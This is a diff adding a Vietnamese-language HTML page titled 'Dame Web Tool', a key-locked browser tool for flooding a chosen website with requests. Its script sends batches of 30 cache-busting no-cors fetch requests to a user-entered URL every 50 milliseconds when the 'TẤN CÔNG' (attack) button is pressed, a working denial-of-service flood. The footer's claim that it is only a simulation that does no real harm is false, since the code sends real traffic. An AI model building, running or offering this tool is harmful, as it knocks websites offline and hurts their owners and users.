@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Dame Web Tool</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0b0e14;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            padding: 16px;
+        }
+        /* LOCK */
+        #lockScreen {
+            position: fixed;
+            inset: 0;
+            background: rgba(8,12,20,0.96);
+            backdrop-filter: blur(8px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            flex-direction: column;
+            transition: opacity 0.5s;
+        }
+        #lockScreen.hidden { opacity: 0; pointer-events: none; }
+        .lock-box {
+            background: #161c27;
+            padding: 40px 30px;
+            border-radius: 48px;
+            border: 1px solid #2d3748;
+            max-width: 380px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.8);
+        }
+        .lock-box h2 { color: #f5c542; font-size: 28px; letter-spacing: 2px; margin-bottom: 6px; }
+        .lock-box p { color: #8b949e; font-size: 14px; margin-bottom: 24px; }
+        .lock-box input {
+            width: 100%;
+            padding: 16px;
+            border-radius: 60px;
+            border: 2px solid #2d3748;
+            background: #0b0e14;
+            color: #f0f6fc;
+            font-size: 18px;
+            text-align: center;
+            outline: none;
+            margin-bottom: 16px;
+            letter-spacing: 2px;
+        }
+        .lock-box input:focus { border-color: #f5c542; }
+        .lock-box .btn-key {
+            background: #f5c542;
+            border: none;
+            padding: 16px;
+            border-radius: 60px;
+            font-size: 20px;
+            font-weight: 800;
+            color: #0b0e14;
+            width: 100%;
+            cursor: pointer;
+            box-shadow: 0 6px 0 #a07d2a;
+            transition: 0.08s linear;
+        }
+        .lock-box .btn-key:active { transform: translateY(5px); box-shadow: 0 2px 0 #a07d2a; }
+        .lock-box .error { color: #f87171; font-size: 14px; min-height: 24px; margin-top: 10px; }
+
+        /* MAIN APP */
+        #app {
+            width: 100%;
+            max-width: 560px;
+            background: #131a24;
+            border-radius: 48px;
+            padding: 28px 22px 30px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.8), inset 0 0 0 1px #2a3442;
+            border: 1px solid #1e2633;
+            display: none;
+        }
+        #app.active { display: block; }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 18px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #1e2633;
+        }
+        .header h1 { color: #f5c542; font-size: 24px; font-weight: 800; letter-spacing: 1px; text-shadow: 0 0 12px #f5c54233; }
+        .header .ver { color: #6a7b94; font-size: 13px; background: #0b0e14; padding: 4px 14px; border-radius: 30px; border: 1px solid #2a3442; }
+
+        .domain-select {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin: 16px 0 12px;
+        }
+        .domain-select button {
+            flex: 1;
+            padding: 12px 0;
+            border-radius: 40px;
+            border: 2px solid #2d3748;
+            background: transparent;
+            color: #8b949e;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.15s;
+            min-width: 60px;
+        }
+        .domain-select button.active {
+            background: #f5c542;
+            color: #0b0e14;
+            border-color: #f5c542;
+            box-shadow: 0 0 20px #f5c54244;
+        }
+        .input-group {
+            display: flex;
+            gap: 12px;
+            margin: 12px 0;
+            flex-wrap: wrap;
+        }
+        .input-group input {
+            flex: 1;
+            padding: 14px 18px;
+            border-radius: 60px;
+            border: 2px solid #2d3748;
+            background: #0b0e14;
+            color: #f0f6fc;
+            font-size: 16px;
+            outline: none;
+            min-width: 180px;
+        }
+        .input-group input:focus { border-color: #f5c542; }
+        .input-group button {
+            padding: 14px 28px;
+            border: none;
+            border-radius: 60px;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            background: #f5c542;
+            color: #0b0e14;
+            box-shadow: 0 4px 0 #a07d2a;
+            transition: 0.08s linear;
+        }
+        .input-group button:active { transform: translateY(4px); box-shadow: 0 1px 0 #a07d2a; }
+        .input-group button:disabled { opacity: 0.4; pointer-events: none; }
+
+        .control-bar {
+            display: flex;
+            gap: 14px;
+            flex-wrap: wrap;
+            margin: 16px 0 12px;
+        }
+        .btn {
+            padding: 14px 28px;
+            border: none;
+            border-radius: 60px;
+            font-weight: 700;
+            font-size: 17px;
+            cursor: pointer;
+            transition: 0.08s;
+            flex: 1;
+        }
+        .btn-start { background: #e74c3c; color: white; box-shadow: 0 4px 0 #a93226; }
+        .btn-start:active { transform: translateY(4px); box-shadow: 0 1px 0 #a93226; }
+        .btn-stop { background: #4ade80; color: #0b0e14; box-shadow: 0 4px 0 #1f8b4c; }
+        .btn-stop:active { transform: translateY(4px); box-shadow: 0 1px 0 #1f8b4c; }
+        .btn-stop:disabled { opacity: 0.4; pointer-events: none; }
+
+        .stats {
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+            background: #0b0e14;
+            border-radius: 40px;
+            padding: 12px 18px;
+            border: 1px solid #1e2633;
+            margin: 12px 0;
+            font-size: 14px;
+        }
+        .stats span { color: #f5c542; font-weight: 700; }
+
+        .log {
+            background: #0b0e14;
+            border-radius: 16px;
+            padding: 14px;
+            max-height: 220px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            line-height: 1.6;
+            border: 1px solid #1e2633;
+            margin-top: 12px;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        .log .info { color: #58a6ff; }
+        .log .warn { color: #fbbf24; }
+        .log .error { color: #f87171; }
+        .log .success { color: #4ade80; }
+
+        .footer {
+            text-align: center;
+            color: #484f5a;
+            font-size: 10px;
+            margin-top: 16px;
+            border-top: 1px solid #1e2633;
+            padding-top: 12px;
+        }
+
+        @media (max-width: 480px) {
+            .domain-select button { font-size: 14px; padding: 10px 0; }
+            .btn { font-size: 15px; padding: 12px 16px; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- LOCK -->
+<div id="lockScreen">
+    <div class="lock-box">
+        <h2>🔐 DAME TOOL</h2>
+        <p>Nhập key để truy cập</p>
+        <input type="password" id="keyInput" placeholder="Nhập key..." autofocus>
+        <button class="btn-key" id="unlockBtn">XÁC NHẬN</button>
+        <div class="error" id="errorMsg"></div>
+    </div>
+</div>
+
+<!-- APP -->
+<div id="app">
+    <div class="header">
+        <h1>⚡ DAME WEB</h1>
+        <span class="ver">v2.0</span>
+    </div>
+
+    <div style="color:#6a7b94; font-size:14px; margin-bottom:10px;">Chọn loại tên miền:</div>
+    <div class="domain-select" id="domainGroup">
+        <button data-domain="vn">.vn</button>
+        <button data-domain="net">.net</button>
+        <button data-domain="shop">.shop</button>
+        <button data-domain="github">github.io</button>
+    </div>
+
+    <div class="input-group">
+        <input type="text" id="linkInput" placeholder="Nhập link theo tên miền đã chọn">
+        <button id="continueBtn">TIẾP TỤC</button>
+    </div>
+
+    <div class="stats">
+        <div>Trạng thái: <span id="statusText">🔴 Chưa kích hoạt</span></div>
+        <div>Đã gửi: <span id="count">0</span></div>
+        <div>Lỗi: <span id="errors">0</span></div>
+    </div>
+
+    <div class="control-bar">
+        <button class="btn btn-start" id="attackBtn">🔥 TẤN CÔNG</button>
+        <button class="btn btn-stop" id="stopBtn" disabled>⏹ DỪNG</button>
+    </div>
+
+    <div class="log" id="logOutput">
+[SYSTEM] Chọn tên miền và nhập link, sau đó ấn TIẾP TỤC.
+[SYSTEM] Sau đó nhấn TẤN CÔNG để bắt đầu.
+    </div>
+    <div class="footer">⚠️ CÔNG CỤ MÔ PHỎNG. KHÔNG GÂY HẠI THỰC TẾ.</div>
+</div>
+
+<script>
+    (function() {
+        'use strict';
+
+        // DOM
+        const lockScreen = document.getElementById('lockScreen');
+        const keyInput = document.getElementById('keyInput');
+        const unlockBtn = document.getElementById('unlockBtn');
+        const errorMsg = document.getElementById('errorMsg');
+        const app = document.getElementById('app');
+
+        const domainBtns = document.querySelectorAll('#domainGroup button');
+        const linkInput = document.getElementById('linkInput');
+        const continueBtn = document.getElementById('continueBtn');
+        const attackBtn = document.getElementById('attackBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const statusText = document.getElementById('statusText');
+        const countSpan = document.getElementById('count');
+        const errorsSpan = document.getElementById('errors');
+        const logOutput = document.getElementById('logOutput');
+
+        // State
+        let selectedDomain = '';
+        let targetUrl = '';
+        let isRunning = false;
+        let attackInterval = null;
+        let totalRequests = 0;
+        let errorCount = 0;
+
+        // Log
+        function addLog(msg, type = 'info') {
+            const line = document.createElement('div');
+            line.className = type;
+            line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            logOutput.appendChild(line);
+            logOutput.scrollTop = logOutput.scrollHeight;
+            if (logOutput.children.length > 120) logOutput.removeChild(logOutput.children[0]);
+        }
+
+        // Lấy domain đã chọn
+        function getSelectedDomain() {
+            let domain = '';
+            domainBtns.forEach(btn => {
+                if (btn.classList.contains('active')) domain = btn.dataset.domain;
+            });
+            return domain;
+        }
+
+        // Xác thực link theo domain
+        function validateLink(link, domain) {
+            if (!link) return false;
+            let pattern = '';
+            switch(domain) {
+                case 'vn': pattern = /^https?:\/\/[a-z0-9.-]+\.vn(\/.*)?$/i; break;
+                case 'net': pattern = /^https?:\/\/[a-z0-9.-]+\.net(\/.*)?$/i; break;
+                case 'shop': pattern = /^https?:\/\/[a-z0-9.-]+\.shop(\/.*)?$/i; break;
+                case 'github': pattern = /^https?:\/\/[a-z0-9-]+\.github\.io(\/.*)?$/i; break;
+                default: return false;
+            }
+            return pattern.test(link);
+        }
+
+        // Domain button click
+        domainBtns.forEach(btn => {
+            btn.addEventListener('click', function() {
+                domainBtns.forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                selectedDomain = this.dataset.domain;
+                linkInput.placeholder = `Nhập link .${selectedDomain}`;
+                // Xóa trạng thái tiếp tục
+                targetUrl = '';
+                statusText.textContent = '🔴 Chưa chọn link';
+                statusText.style.color = '#f87171';
+                addLog(`Chọn tên miền: .${selectedDomain}`, 'info');
+            });
+        });
+        // Mặc định chọn .vn
+        domainBtns[0].classList.add('active');
+        selectedDomain = 'vn';
+        linkInput.placeholder = 'Nhập link .vn';
+
+        // Continue
+        continueBtn.addEventListener('click', function() {
+            const domain = getSelectedDomain();
+            if (!domain) {
+                addLog('⚠️ Vui lòng chọn tên miền.', 'error');
+                return;
+            }
+            let link = linkInput.value.trim();
+            if (!link) {
+                addLog('⚠️ Vui lòng nhập link.', 'error');
+                return;
+            }
+            if (!validateLink(link, domain)) {
+                addLog(`⚠️ Link không đúng định dạng .${domain}. Vui lòng nhập lại.`, 'error');
+                return;
+            }
+            targetUrl = link;
+            statusText.textContent = `🟢 Sẵn sàng: ${targetUrl}`;
+            statusText.style.color = '#4ade80';
+            addLog(`✅ Đã thiết lập mục tiêu: ${targetUrl}`, 'success');
+        });
+
+        // Attack function
+        function sendRequest() {
+            if (!isRunning || !targetUrl) return;
+            // Gửi nhiều request với fetch (mode no-cors để không bị CORS)
+            const batch = 30; // mỗi lần gửi 30 request
+            for (let i = 0; i < batch; i++) {
+                const url = targetUrl + (targetUrl.includes('?') ? '&' : '?') + '_=' + Date.now() + '_' + Math.random().toString(36).substr(2,6);
+                fetch(url, { 
+                    method: 'GET', 
+                    mode: 'no-cors', 
+                    cache: 'no-store',
+                    headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' }
+                }).catch(() => {
+                    errorCount++;
+                    errorsSpan.textContent = errorCount;
+                });
+                totalRequests++;
+                countSpan.textContent = totalRequests;
+            }
+        }
+
+        // Attack loop
+        function attackLoop() {
+            if (!isRunning) return;
+            sendRequest();
+            // Gọi tiếp sau 50ms
+            if (isRunning) {
+                attackInterval = setTimeout(attackLoop, 50);
+            }
+        }
+
+        // Start attack
+        attackBtn.addEventListener('click', function() {
+            if (isRunning) return;
+            if (!targetUrl) {
+                addLog('⚠️ Chưa có link mục tiêu. Ấn TIẾP TỤC trước.', 'error');
+                return;
+            }
+            isRunning = true;
+            attackBtn.disabled = true;
+            stopBtn.disabled = false;
+            totalRequests = 0;
+            errorCount = 0;
+            countSpan.textContent = '0';
+            errorsSpan.textContent = '0';
+            statusText.textContent = `⚡ ĐANG TẤN CÔNG ${targetUrl}`;
+            statusText.style.color = '#f5c542';
+            addLog(`🔥 Bắt đầu tấn công ${targetUrl}`, 'warn');
+            // Bắt đầu vòng lặp
+            attackLoop();
+        });
+
+        // Stop
+        stopBtn.addEventListener('click', function() {
+            if (!isRunning) return;
+            isRunning = false;
+            clearTimeout(attackInterval);
+            attackBtn.disabled = false;
+            stopBtn.disabled = true;
+            statusText.textContent = `⏹ Đã dừng. Tổng: ${totalRequests} request`;
+            statusText.style.color = '#6a7b94';
+            addLog(`⏹ Dừng tấn công. Tổng request: ${totalRequests}`, 'info');
+        });
+
+        // Unlock
+        function unlock() {
+            const key = keyInput.value.trim();
+            if (key === 'xtinhdz') {
+                lockScreen.classList.add('hidden');
+                app.classList.add('active');
+                addLog('🔓 Mở khóa thành công. Chào mừng!', 'success');
+                errorMsg.textContent = '';
+            } else {
+                errorMsg.textContent = '❌ Sai key!';
+                keyInput.value = '';
+                keyInput.focus();
+            }
+        }
+
+        unlockBtn.addEventListener('click', unlock);
+        keyInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') unlock();
+        });
+
+        // Focus
+        keyInput.focus();
+
+        // Thêm log ban đầu
+        addLog('[SYSTEM] Đã sẵn sàng. Nhập key để bắt đầu.', 'info');
+
+        // Ngăn chặn hành vi mặc định khi enter trên input
+        linkInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') continueBtn.click();
+        });
+
+        console.log('✅ Dame Web Tool loaded. Key: xtinhdz');
+    })();
+</script>
+</body>
+</html>
